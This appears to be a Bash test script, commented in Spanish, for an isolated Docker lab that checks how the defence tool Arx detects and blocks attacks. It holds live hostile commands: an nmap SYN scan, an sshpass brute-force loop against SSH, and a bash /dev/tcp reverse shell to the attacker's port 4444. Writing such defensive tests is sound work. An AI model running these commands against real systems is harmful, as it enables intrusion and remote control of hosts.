#!/usr/bin/env bash
# Mini-lab Docker de Arx — DOS contenedores en red aislada (ver lab/lib.sh).
# Niveles: L1 escaneo nmap real · L2 fuerza bruta SSH real · L6 reverse shell real ·
# L4/L5/L7/L8/L9 en víctima. Niveles 3 y 10 son destructivos/VM (lab/README.md, lab/vm/).
set -euo pipefail
cd "$(dirname "$0")/.."
source lab/lib.sh

FAILED=0
trap cleanup EXIT

echo "══ red y contenedores ══"
lab_up
echo "atacante: $ATTACKER_IP"

step() { echo; echo "══ $1 ══"; }

step "preparación de la víctima (learn + seal + canario + señuelos de puerto)"
docker exec "$VIC" python3 /src/lab/driver.py prep

step "nivel 1: escaneo real — nmap -sS (SYN, el escaneo por defecto) desde el atacante"
docker exec "$ATT" nmap -sS -p 9000-9020 --max-retries 1 victim | grep -E "open|closed" | head -4 || true
docker exec "$VIC" bash -c 'nft list set inet arx scan4 2>/dev/null | head -8' || true
docker exec "$VIC" python3 /src/lab/driver.py net-scan "$ATTACKER_IP" || FAILED=1

# El bloqueo del L1 cortaría la fuerza bruta del L2: liberar entre fases (ciclo real
# de expiración, no un flush a mano).
docker exec "$VIC" python3 /src/lab/driver.py release

step "nivel 2: fuerza bruta real — 8 intentos SSH fallidos desde el atacante"
docker exec "$ATT" bash -c 'for i in $(seq 8); do
  sshpass -p "clave-mala-$i" ssh -o StrictHostKeyChecking=no \
    -o PreferredAuthentications=password -o ConnectTimeout=3 root@victim true \
    2>/dev/null || true
done'
docker exec "$VIC" python3 /src/lab/driver.py net-brute "$ATTACKER_IP" || FAILED=1

step "prueba de contención: el atacante ya NO alcanza a la víctima"
if docker exec "$ATT" curl -s --max-time 4 http://victim:9001/ >/dev/null 2>&1; then
  echo "[FAIL] contención: el atacante SIGUE alcanzando la víctima tras el bloqueo"
  FAILED=1
else
  echo "[PASS] contención: la IP del atacante quedó bloqueada (curl agota el tiempo)"
fi

# L6 necesita que el handshake saliente complete: liberar el bloqueo del L2 (la regla de
# entrada descartaría la respuesta del atacante si siguiera bloqueado).
docker exec "$VIC" python3 /src/lab/driver.py release

step "nivel 6: reverse shell clásico — bash -i de la víctima hacia el C2 del atacante"
# docker exec -d: el shell sobrevive a esta llamada; el `driver` no es su padre.
docker exec -d "$VIC" bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1"
c2_send "touch /tmp/c2-antes"      # debe ejecutarse: prueba que el shell es real
docker exec "$VIC" python3 /src/lab/driver.py net-revsh "$ATTACKER_IP" || FAILED=1
c2_send "touch /tmp/c2-despues"    # no debe llegar mientras dure el bloqueo
docker exec "$VIC" python3 /src/lab/driver.py net-revsh-verify "$ATTACKER_IP" || FAILED=1

step "niveles 4, 5, 7, 8 y 9 en la víctima"
docker exec "$VIC" python3 /src/lab/driver.py levels || FAILED=1

step "tarpit (Core): con política 'tarpit' se ESTRANGULA la IP en vez de bloquearla"
# Reutiliza el MISMO escaneo del L1 (sin ataque nuevo) para repoblar la pista scan4;
# net-tarpit parte de pizarra limpia (el tarpit es un primer contacto) y comprueba que
# la IP cae en tarpit4 con reglas de rate-limit per-IP, no en block_ipv4.
docker exec "$ATT" nmap -sS -p 9000-9020 --max-retries 1 victim >/dev/null 2>&1 || true
docker exec "$VIC" python3 /src/lab/driver.py net-tarpit "$ATTACKER_IP" || FAILED=1
# El efecto se mide desde el atacante: que exista la regla no prueba que estrangule.
SEEN=$(docker exec "$ATT" nmap -sS -p 9001-9012 -T4 --max-retries 0 victim | grep -cE "^[0-9]+/tcp +open" || true)
if [ "$SEEN" -le 4 ]; then
  echo "[PASS] tarpit: el escáner ve $SEEN de 12 puertos abiertos"
else
  echo "[FAIL] tarpit: el escáner sigue viendo $SEEN de 12 puertos abiertos"
  FAILED=1
fi
docker exec "$VIC" python3 /src/lab/driver.py release

step "ficheros-trampa: el bucle de guardia no debe colgarse, morir ni soltar al dropper"
docker exec "$VIC" python3 /src/lab/driver.py hostile || FAILED=1

step "identidad: el bloqueo cierra sesiones y accesos, y solo una persona lo levanta"
docker exec "$VIC" python3 /src/lab/driver.py identity || FAILED=1

step "identidad con el modelo: un acceso real sin terminal, confirmado como amenaza"
docker exec -d "$ATT" sshpass -p clave-bob ssh -o StrictHostKeyChecking=no bob@victim "sleep 900"
sleep 3
docker exec "$VIC" python3 /src/lab/driver.py identity-llm "$ATTACKER_IP" || FAILED=1
if docker exec "$ATT" pgrep -f "ssh.*bob@victim" >/dev/null 2>&1; then
  echo "[FAIL] el atacante conserva su sesión tras el bloqueo"; FAILED=1
else
  echo "[PASS] la sesión del atacante está cerrada, medido desde el atacante"
fi
# El bloqueo de la IP expira (una IP cambia de manos); el de la cuenta no.
docker exec "$VIC" python3 /src/lab/driver.py release
if docker exec "$ATT" sshpass -p clave-bob ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 bob@victim true 2>/dev/null; then
  echo "[FAIL] sin bloqueo de IP, la contraseña robada vuelve a entrar"; FAILED=1
else
  echo "[PASS] expirada la IP, la contraseña robada sigue sin entrar"
fi
docker exec "$VIC" python3 /src/lab/driver.py identity-unlock || FAILED=1
if docker exec "$ATT" sshpass -p clave-bob ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 bob@victim true 2>/dev/null; then
  echo "[PASS] tras arx unlock la cuenta vuelve a entrar"
else
  echo "[FAIL] tras arx unlock la cuenta no entra"; FAILED=1
fi

step "evasión: una conexión sin autenticar no vuelve intocable al atacante; una sesión real sí protege"
docker exec -d "$ATT" bash -c 'sleep 60 | nc victim 22'
sleep 1
docker exec "$VIC" python3 /src/lab/driver.py operator "$ATTACKER_IP" no || FAILED=1
docker exec "$ATT" pkill -f "[n]c victim 22" || true
docker exec -d "$ATT" sshpass -p clave-bob ssh -o StrictHostKeyChecking=no bob@victim "sleep 60"
sleep 3
docker exec "$VIC" python3 /src/lab/driver.py operator "$ATTACKER_IP" si || FAILED=1
docker exec "$ATT" pkill -f "[b]ob@victim" || true

step "línea falsificada: cualquier usuario escribe en auth.log; eso no basta para bloquear"
docker exec "$VIC" python3 /src/lab/driver.py identity-forged || FAILED=1

step "alias de root: alerta crítica y bloqueo que no afecta a root"
docker exec "$VIC" python3 /src/lab/driver.py uid0 || FAILED=1

step "propuestas: tras la fuerza bruta, Arx propone cerrar las contraseñas; se prueba contra sshd real"
docker exec "$VIC" python3 /src/lab/driver.py proposal-apply || FAILED=1
if docker exec "$ATT" sshpass -p clave-bob ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o PreferredAuthentications=password bob@victim true 2>/dev/null; then
  echo "[FAIL] con la propuesta aplicada, la contraseña sigue entrando"; FAILED=1
else
  echo "[PASS] con la propuesta aplicada, la contraseña ya no entra"
fi
docker exec "$VIC" python3 /src/lab/driver.py proposal-revert || FAILED=1
if docker exec "$ATT" sshpass -p clave-bob ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o PreferredAuthentications=password bob@victim true 2>/dev/null; then
  echo "[PASS] deshecha, la contraseña vuelve a entrar"
else
  echo "[FAIL] deshecha, la contraseña no entra"; FAILED=1
fi

step "contenedores del host: una IP bloqueada tampoco llega a un puerto publicado (FORWARD)"
docker exec "$VIC" python3 /src/lab/driver.py forward-up
if docker exec "$ATT" nc -z -w 3 victim 8088 2>/dev/null; then
  echo "[PASS] sin bloqueo, el atacante llega al servicio publicado"
else
  echo "[FAIL] el servicio publicado no responde: la prueba no prueba nada"; FAILED=1
fi
docker exec "$VIC" python3 /src/lab/driver.py forward-block "$ATTACKER_IP" || FAILED=1
if docker exec "$ATT" nc -z -w 3 victim 8088 2>/dev/null; then
  echo "[FAIL] la IP bloqueada sigue entrando al contenedor"; FAILED=1
else
  echo "[PASS] la IP bloqueada ya no llega al contenedor"
fi
docker exec "$VIC" python3 /src/lab/driver.py release

step "F17 vacunas: canal servido desde otra máquina; la firma manda, y cada host valida por su cuenta"
docker run -d --name "$VIC2" --network "$NET" -v "$PWD":/src:ro ubuntu:22.04 bash -c '
  export DEBIAN_FRONTEND=noninteractive
  apt-get update -qq >/dev/null 2>&1
  apt-get install -y -qq python3 >/dev/null 2>&1
  mkdir -p /work/labcfg /work/labstate
  # solo este host tiene este binario: una regla que case con él no puede valer aquí
  printf "binario legitimo del host B: lab-minero-legit\n" > /usr/bin/aa-herramienta-b
  touch /ready; sleep infinity' >/dev/null
docker exec "$VIC2" bash -c 'for i in $(seq 180); do [ -f /ready ] && exit 0; sleep 1; done; exit 1'
docker exec "$VIC" python3 /src/lab/driver.py vaccine-sign
# El "canal" es un servidor cualquiera, aquí incluso el del atacante: sin la clave no puede colar nada
docker exec "$ATT" mkdir -p /srv/canal
for f in feed.signed.json feed.tampered.json feed.other-key.json; do
  docker exec "$VIC" cat "/work/$f" | docker exec -i "$ATT" sh -c "cat > /srv/canal/$f"
done
PUB=$(docker exec "$VIC" cat /work/feed.pub)
docker exec -d "$ATT" python3 -m http.server 8000 --directory /srv/canal
sleep 1
docker exec "$VIC" python3 /src/lab/driver.py vaccine-apply "$PUB" valida || FAILED=1
docker exec "$VIC2" python3 /src/lab/driver.py vaccine-apply "$PUB" insuficiente || FAILED=1
# Una IP pública de verdad en el atacante: una vacuna no admite redes privadas
docker exec "$ATT" ip addr add 185.220.101.50/32 dev eth0
docker exec "$VIC" ip route add 185.220.101.50/32 via "$ATTACKER_IP"
docker exec -d "$ATT" bash -c 'sleep 90 | nc -s 185.220.101.50 victim 9001'
sleep 2
docker exec "$VIC" python3 /src/lab/driver.py vaccine-intel || FAILED=1
if docker exec "$ATT" nc -z -w 3 -s 185.220.101.50 victim 9001 2>/dev/null; then
  echo "[FAIL] la IP de la vacuna sigue llegando"; FAILED=1
else
  echo "[PASS] la IP de la vacuna ya no llega, medido desde ella"
fi
if docker exec "$ATT" nc -z -w 3 victim 9001 2>/dev/null; then
  echo "[PASS] una IP que la vacuna no señala sigue llegando"
else
  echo "[FAIL] se ha bloqueado también a quien la vacuna no señala"; FAILED=1
fi
docker exec "$VIC" python3 /src/lab/driver.py release

step "F6 sandbox estático (Core): ¿este fichero es malicioso? — sin ejecutar nada"
docker exec "$VIC" python3 /src/lab/driver.py sandbox || FAILED=1

step "F16 informe forense (Core): cronología sellada (cadena de hash + HMAC)"
docker exec "$VIC" python3 /src/lab/driver.py forensics || FAILED=1

echo
if [ "$FAILED" = 0 ]; then
  echo "══ MINI-LAB COMPLETO: todos los niveles ejecutables superados ══"
else
  echo "══ MINI-LAB CON FALLOS (ver líneas [FAIL]) ══"
  exit 1
fi
